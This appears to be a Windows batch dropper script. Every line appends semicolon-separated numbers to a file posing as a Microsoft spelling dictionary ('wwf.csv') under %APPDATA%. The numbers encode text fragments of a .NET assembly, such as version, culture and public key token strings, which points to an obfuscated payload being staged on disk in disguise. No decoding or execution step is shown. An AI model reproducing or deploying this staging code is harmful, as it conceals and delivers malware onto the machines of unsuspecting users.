>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;816.0;3156.570;0.820;0.350;0.3185;614.52;60.46;60.48;5023.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.30;48.40;46.3717;60.48;30.14;819.0;5447.802;0.499;0.646;0.9259;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;820.0;801.0;0759.492;169.50;32.60;77.4864;40.105;50.99;70.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9399.40;111.30;115.40;111.6523;50.102;50.116;50.32;4773.40;67.60;111.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.0715;40.112;70.111;40.114;0855.50;97.50;116.40;105.3493;70.111;30.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.46;7517.50;32.40;32.70;65.6680;50.108;50.108;50.32;2260.60;114.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.30;103.2749;30.104;40.116;30.115;6829.50;32.60;114.30;101.4023;50.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;70.114;5370.30;118.70;101.40;100.1586;30.46;50.20;352.0;6501.446;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.456;0.446;0.9148;551.0;357.0;750.0;7793.556;0.446;0.348;0.7910;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(310.51;40.48;30.51;3653.70;49.70;57.60;2.2437;348.0;74.111;818.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0700.50;32.798;0.755;0.4088;755.0;697.0;653.0;0130.699;0.353;0.654;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6508;549.0;757.0;751.0;3922.652;0.801;0.348;0.7912;356.0;657.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(764.48;6761.50;48.40;48.50;48.8731;50.48;40.48;70.48;6822.30;48.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.40;48.5310;60.48;50.48;40.48;3342.30;48.50;48.70;48.4675;50.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.52;30.48;8107.30;48.60;48.30;48.3580;50.48;40.48;40.48;0647.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.60;48.70;48.9759;70.48;60.48;30.48;8594.40;48.40;32.451;0.6434;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(749.0;798.0;802.0;2222.451;0.556;0.453;0.1103;354.0;597.0;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5786.651;0.654;0.452;0.9287;801.0;351.0;653.0;6970.830;128.648;0.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4949;650.0;752.0;348.0;0425.448;0.648;0.448;0.5145;748.0;352.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(356.0;3914.348;0.548;0.648;0.4108;648.0;648.0;457.0;3565.452;0.448;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.748;0.7528;348.0;448.0;648.0;5225.748;0.348;0.754;0.3158;448.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(650.0;648.0;0202.548;0.348;0.648;0.6380;448.0;548.0;750.0;9006.552;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.748;0.748;0.9262;748.0;448.0;753.0;8699.750;0.553;0.751;0.9117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(552.0;749.0;451.0;8396.349;0.548;0.548;0.0556;748.0;352.0;548.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8372.748;0.348;0.448;0.2967;648.0;749.0;548.0;7864.348;0.548;0.349;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0242;348.0;448.0;466.0;8075.653;0.470;0.767;0.3088;457.0;748.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(769.0;5903.655;0.548;0.550;0.0043;755.0;470.0;454.0;6007.555;0.656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.655;0.7900;649.0;369.0;755.0;9278.655;0.651;0.365;0.6667;656.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(670.0;468.0;4768.369;0.756;0.557;0.9997;651.0;756.0;667.0;6623.656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.749;0.468;0.0473;768.0;552.0;748.0;9527.350;0.666;0.565;0.3690;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(654.0;653.0;766.0;6111.657;0.350;0.548;0.3842;549.0;468.0;454.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0737.348;0.653;0.457;0.6209;351.0;369.0;357.0;3721.654;0.467;0.452;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4043;557.0;550.0;454.0;4815.653;0.749;0.669;0.9308;756.0;356.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(557.0;6958.767;0.767;0.449;0.9097;551.0;370.0;449.0;8250.452;0.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.653;0.9024;369.0;766.0;366.0;8028.453;0.551;0.770;0.9359;665.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(367.0;749.0;1236.349;0.651;0.549;0.3866;365.0;669.0;648.0;7866.566;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.568;0.551;0.3437;351.0;551.0;367.0;0608.353;0.569;0.569;0.8814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(554.0;448.0;650.0;6915.649;0.654;0.555;0.5925;650.0;668.0;357.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3421.755;0.749;0.456;0.8531;569.0;765.0;451.0;2429.449;0.765;0.656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1288;465.0;669.0;666.0;8123.668;0.648;0.468;0.7994;565.0;748.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(348.0;4588.755;0.650;0.370;0.3042;650.0;753.0;768.0;4222.656;0.455;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.468;0.9337;466.0;765.0;554.0;1621.770;0.467;0.457;0.4337;348.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(570.0;370.0;9315.568;0.653;0.457;0.7148;756.0;669.0;568.0;2538.652;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.368;0.665;0.5527;451.0;653.0;769.0;4839.752;0.752;0.667;0.4541;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(551.0;557.0;556.0;6412.467;0.552;0.753;0.0218;752.0;551.0;648.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3788.655;0.769;0.756;0.4919;569.0;651.0;351.0;2904.766;0.356;0.552;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4001;350.0;754.0;349.0;4178.652;0.751;0.668;0.3030;365.0;569.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(467.0;7526.757;0.370;0.453;0.0027;457.0;454.0;656.0;6438.451;0.654;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.570;0.6115;657.0;555.0;667.0;1288.656;0.770;0.655;0.6298;652.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(355.0;653.0;4257.348;0.469;0.753;0.6502;557.0;555.0;653.0;6240.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.554;0.552;0.5806;569.0;350.0;649.0;1857.656;0.757;0.370;0.1515;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(452.0;753.0;768.0;0248.569;0.370;0.352;0.8608;554.0;366.0;450.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5507.565;0.750;0.766;0.6190;449.0;750.0;752.0;4373.655;0.465;0.768;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9357;367.0;351.0;754.0;6519.353;0.550;0.466;0.7420;770.0;553.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(367.0;8387.651;0.648;0.356;0.2986;748.0;453.0;653.0;7272.468;0.365;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.457;0.6082;632.55;30.99;30.101;9195.50;99.50;56.50;53.3288;60.100;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.55;50.98;3197.60;101.50;97.50;55.6165;70.55;60.57;50.56;1814.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.60;130.828;48.7454;30.48;70.50;40.52;0203.40;48.50;48.50;48.0217;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.48;30.48;60.52;6491.40;56.70;48.70;48.6914;60.48;70.48;50.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9474.40;57.40;52.70;48.4682;50.48;70.48;70.48;1065.50;48.70;48.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.0948;40.54;30.48;30.50;1974.40;48.40;48.50;48.3548;70.48;60.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.48;6883.40;50.40;52.30;48.2882;70.48;30.48;30.48;9923.40;53.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.70;53.2711;40.51;50.52;50.49;4222.70;51.30;49.50;48.2882;70.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.48;70.52;7983.50;48.30;48.60;48.1949;60.48;30.48;40.49;8071.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.60;48.70;48.9858;50.49;30.48;30.48;9619.70;56.60;68.30;53.8319;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.54;40.67;60.55;1760.30;54.40;70.50;57.4422;50.69;40.56;50.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2508.60;52.70;57.40;51.7341;70.56;50.51;70.48;8658.50;52.60;57.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.6099;70.51;60.56;70.51;0443.40;67.30;52.70;52.2757;50.66;30.69;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.48;6103.50;69.40;67.50;50.9816;30.48;50.52;60.49;3724.70;56.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.60;56.4602;40.50;60.50;60.65;9569.50;54.50;67.50;51.0540;60.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.67;30.70;4036.30;53.40;69.60;66.6684;70.55;60.69;50.70;8209.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.40;56.50;54.8255;40.57;40.52;40.52;2123.40;68.30;48.70;51.6872;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.50;60.49;40.56;7607.50;56.30;69.30;65.7130;70.49;30.68;40.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6296.70;57.60;50.50;48.3436;60.55;70.54;30.51;6321.60;55.60;49.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.2441;70.67;30.67;30.66;7037.40;49.50;50.70;68.5931;40.55;70.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.70;1955.40;66.70;55.70;55.9401;40.69;60.57;70.56;4816.40;49.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.70;49.4443;40.52;70.57;30.69;5194.50;54.60;49.40;52.0353;40.56;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.69;50.53;5469.40;68.30;51.60;50.3986;40.70;30.66;60.65;0965.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(65.30;66.50;51.5840;70.55;70.54;70.49;2543.40;49.40;67.50;49.6617;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.56;50.55;70.56;1503.70;68.70;68.30;67.3775;60.49;60.57;40.69;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1342.50;50.30;48.30;69.2419;30.70;70.49;70.51;7422.50;53.60;68.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.3734;30.67;60.66;50.50;8556.60;67.50;70.70;70.2257;40.50;30.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.70;3556.40;69.50;67.40;51.3454;50.68;50.49;40.49;9313.30;53.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.60;49.1109;60.48;60.67;50.51;3306.60;68.60;57.70;48.9716;50.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.57;50.54;0137.50;51.40;56.70;70.8627;40.69;40.52;30.66;7072.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(69.50;50.70;49.6830;70.53;50.68;50.66;6304.50;70.70;55.40;57.8034;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.53;50.56;40.54;3903.50;49.70;57.40;50.6793;60.48;60.69;70.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3219.30;65.40;66.70;54.8665;70.70;40.55;60.68;9720.40;66.50;50.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(69.2157;60.50;60.67;40.69;1649.60;69.40;70.40;49.7271;50.51;30.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.65;7987.40;67.40;50.30;51.3083;50.68;70.53;40.68;1455.50;68.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.60;66.5862;30.70;60.48;70.51;9805.70;49.70;55.40;48.5407;70.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.65;30.69;1989.40;67.50;50.30;51.9802;30.50;60.70;60.54;6921.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.60;54.30;66.0520;30.49;30.67;60.55;1625.60;56.60;53.50;66.7966;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.52;40.51;50.48;4268.70;53.70;67.70;49.3186;70.50;30.51;70.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8211.50;51.60;55.30;65.9478;30.66;70.128;850.109;7003.60;115.30;99.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.7588;70.114;40.108;60.105;6845.60;98.40;44.40;32.6869;50.86;50.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.114;8381.30;115.50;105.40;111.5965;30.110;60.61;60.52;5020.60;46.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.50;46.1214;30.48;60.46;40.48;8410.60;44.60;32.30;67.6105;40.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.108;70.116;2630.30;117.50;114.40;101.7422;60.61;60.110;70.101;3944.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.70;116.40;114.7471;70.97;50.108;60.44;9068.40;32.50;80.50;117.9579;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.98;60.108;30.105;9009.40;99.50;75.60;101.7533;70.121;50.84;40.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7284.40;107.40;101.50;110.8777;40.61;50.98;50.55;3291.40;55.30;97.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(53.5232;30.99;60.53;70.54;4332.60;49.50;57.50;51.8557;70.52;30.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.48;9381.50;56.40;57.70;128.9820;856.83;70.121;60.115;6080.40;116.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.40;109.3049;30.46;50.68;60.97;8842.40;116.50;97.60;44.8971;50.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.86;40.101;2489.50;114.30;115.70;105.8726;30.111;70.110;50.61;9164.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(52.30;46.70;48.0382;60.46;30.48;60.46;2650.70;48.50;44.30;32.5039;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.67;40.117;30.108;7100.30;116.60;117.60;114.9836;60.101;70.61;60.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0256.60;101.40;117.40;116.9737;40.114;50.97;70.108;6177.40;44.40;32.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(80.6926;60.117;70.98;60.108;6292.50;105.60;99.60;75.0802;50.101;30.121;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.84;9395.40;111.70;107.70;101.3038;70.110;70.61;40.98;3859.60;55.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.30;97.9572;30.53;30.99;40.53;4871.60;54.50;49.30;57.3923;50.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.52;70.101;3918.70;48.40;56.50;57.8471;60.128;882.83;30.121;8441.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.60;116.70;101.2692;40.109;30.46;60.68;9365.40;97.40;116.30;97.1598;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.46;70.79;60.114;2383.70;97.40;99.40;108.2510;30.101;60.67;70.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8134.50;105.60;101.30;110.7737;40.116;50.44;50.32;1285.70;86.60;101.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.0388;70.115;70.105;30.111;7483.50;110.70;61.60;52.6162;60.46;70.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.46;2907.60;48.70;46.50;48.3027;40.44;60.32;70.67;2946.60;117.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.30;116.0427;50.117;40.114;50.101;1096.60;61.30;110.60;101.5105;40.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.116;50.114;5095.70;97.40;108.30;44.3416;50.32;30.80;30.117;1140.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.40;108.70;105.6094;60.99;60.75;70.101;3772.50;121.40;84.50;111.1611;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.107;50.101;60.110;3860.60;61.60;98.40;55.2790;30.55;30.97;50.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4902.60;99.30;53.70;54.9928;50.49;70.57;40.51;1786.70;52.40;101.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.3647;70.56;30.57;60.128;1933.846;83.70;121.70;115.6602;60.116;30.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.109;1394.40;44.70;32.50;86.8574;30.101;50.114;30.115;3332.50;105.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.50;110.0296;70.61;70.52;50.46;2719.40;48.70;46.50;48.0571;70.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.48;50.44;2559.60;32.40;67.30;117.7255;40.108;50.116;70.117;4419.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.60;101.60;61.0592;30.110;40.101;60.117;8695.70;116.70;114.30;97.8328;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.108;40.44;60.32;2317.40;80.50;117.70;98.5109;60.108;70.105;60.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5433.30;75.50;101.40;121.2528;40.84;70.111;30.107;7615.40;101.40;110.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.6186;70.98;50.55;50.55;1347.60;97.40;53.60;99.9893;40.53;50.54;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.49;4207.50;57.40;51.70;52.8595;60.101;30.48;50.56;4122.70;57.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(128.856;83.6153;50.121;50.115;50.116;9412.70;101.30;109.70;46.5860;70.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;50.114;6234.50;101.50;44.70;32.5771;60.86;50.101;60.114;3855.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.70;105.70;111.9913;30.110;30.61;70.52;1359.30;46.60;48.50;46.1506;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.48;50.46;30.48;9492.30;44.50;32.40;67.9053;60.117;70.108;70.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5386.40;117.50;114.70;101.6781;30.61;30.110;30.101;8927.40;117.40;116.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.6755;60.97;70.108;60.44;6144.40;32.60;80.60;117.3818;50.98;70.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.105;6108.60;99.40;75.30;101.0268;50.121;60.84;30.111;3093.60;107.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.30;110.1859;30.61;30.98;70.55;5232.40;55.60;97.40;53.0006;40.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.53;40.54;2399.40;49.60;57.50;51.3476;40.52;50.101;40.48;8037.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.30;57.30;128.4043;864.83;70.121;70.115;5356.60;116.60;101.70;109.7716;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.46;70.78;30.117;3158.60;109.30;101.50;114.3140;60.105;60.99;60.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3519.50;44.50;32.40;86.7291;60.101;40.114;70.115;8991.50;105.30;111.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.2374;70.61;60.52;40.46;2650.70;48.50;46.50;48.9656;30.46;30.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.44;6686.60;32.60;67.30;117.1673;60.108;30.116;60.117;0334.40;114.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.50;61.3354;60.110;60.101;40.117;1220.50;116.50;114.70;97.7911;70.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.44;40.32;3185.30;80.60;117.40;98.9006;50.108;60.105;50.99;6394.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(75.30;101.30;121.1440;30.84;40.111;30.107;9028.40;101.30;110.60;61.7312;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.98;70.55;60.55;8049.60;97.70;53.40;99.0180;30.53;60.54;70.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2033.40;57.30;51.40;52.2521;40.101;30.48;30.56;4489.30;57.30;128.880;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.5173;70.121;70.115;60.116;7144.50;101.30;109.70;46.8794;30.82;30.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.110;4450.40;116.60;105.40;109.5256;60.101;30.46;60.82;4956.70;101.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(109.40;111.2259;40.116;60.105;40.110;1382.30;103.30;44.60;32.1606;50.86;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.101;50.114;7667.50;115.40;105.30;111.7706;50.110;30.61;30.52;7738.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.50;48.30;46.8335;60.48;70.46;70.48;8612.50;44.40;32.70;67.8746;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.117;50.108;30.116;6969.30;117.50;114.60;101.4822;70.61;70.110;50.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1465.60;117.60;116.60;114.0982;60.97;30.108;30.44;0407.60;32.60;80.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.9098;40.98;50.108;40.105;2536.30;99.30;75.30;101.2086;50.121;60.84;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.111;4489.40;107.40;101.60;110.1717;70.61;40.98;30.55;7086.70;55.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.50;53.3924;70.99;60.53;70.54;3019.40;49.30;57.30;51.3333;70.52;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.101;40.48;1734.40;56.70;57.70;128.4260;896.83;40.121;30.115;3279.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.70;101.40;109.6398;60.46;50.84;50.104;7164.70;114.50;101.70;97.8150;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.100;50.105;70.110;8978.30;103.50;46.50;84.3412;30.97;30.115;70.107;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2651.60;115.50;46.60;68.0406;30.97;30.116;40.97;4137.60;102.60;108.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.0732;30.119;70.44;40.32;0295.60;86.70;101.70;114.9190;40.115;60.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;8404.30;110.70;61.40;52.3859;60.46;40.48;30.46;5868.30;48.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.70;48.5815;60.44;60.32;50.67;5941.30;117.60;108.50;116.2694;60.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.114;70.101;6676.70;61.50;110.30;101.2923;70.117;60.116;50.114;4184.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.40;108.70;44.3524;70.32;50.80;60.117;6708.40;98.50;108.50;105.5346;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.99;50.75;50.101;1582.50;121.50;84.60;111.7856;60.107;70.101;40.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9111.30;61.30;98.50;55.4545;40.55;60.97;60.53;7136.30;99.60;53.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(54.6843;50.49;30.57;60.51;8288.60;52.50;101.70;48.2806;30.56;70.57;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.128;4639.874;83.50;121.30;115.6896;70.116;50.101;50.109;2848.60;46.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(87.50;105.5933;30.110;70.100;70.111;7200.40;119.30;115.70;46.8895;30.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.111;50.114;7549.60;109.70;115.50;44.3007;70.32;30.86;50.101;0394.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.40;115.40;105.0054;50.111;50.110;60.61;0025.30;52.30;46.60;48.9540;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.46;30.48;50.46;5268.30;48.60;44.40;32.2818;50.67;30.117;50.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3861.50;116.30;117.40;114.1147;60.101;70.61;60.110;4058.40;101.70;117.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.7400;60.114;30.97;60.108;4126.70;44.70;32.40;80.1915;30.117;70.98;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.108;5762.40;105.30;99.50;75.8930;40.101;70.121;30.84;9727.50;111.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(107.60;101.3707;70.110;60.61;50.98;6196.30;55.70;55.40;97.2680;40.53;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.99;60.53;8257.60;54.30;49.30;57.7397;70.51;60.52;60.101;8591.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.40;56.60;57.2182;50.128;854.83;70.121;4813.50;115.40;116.30;101.4561;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.109;50.46;50.88;3848.60;109.30;108.60;44.1163;50.32;40.86;40.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5585.30;114.60;115.50;105.6785;40.111;30.110;60.61;2503.40;52.30;46.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.5787;50.46;50.48;50.46;0659.70;48.70;44.30;32.5182;50.67;70.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.108;2455.50;116.70;117.40;114.6700;30.101;60.61;70.110;3246.60;101.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.50;116.7455;30.114;70.97;30.108;5588.50;44.70;32.30;80.3953;30.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.98;70.108;2682.60;105.50;99.70;75.9724;30.101;40.121;70.84;9661.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.30;107.40;101.2053;30.110;50.61;30.98;9676.70;55.70;55.70;97.8289;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.53;50.99;30.53;2613.40;54.40;49.50;57.2009;30.51;70.52;50.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0089.70;48.30;56.30;57.5456;70.32;698.0;448.0;1897.351;0.802;0.753;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0828;802.0;455.0;802.0;4291.549;0.649;0.800;0.6949;353.0;548.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(597.0;9277.751;0.497;0.830;128.7218;648.0;448.0;750.0;1104.452;0.448;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.748;0.2469;648.0;748.0;548.0;5617.652;0.456;0.648;0.8697;548.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(348.0;548.0;5152.748;0.557;0.652;0.2245;448.0;348.0;448.0;3484.648;
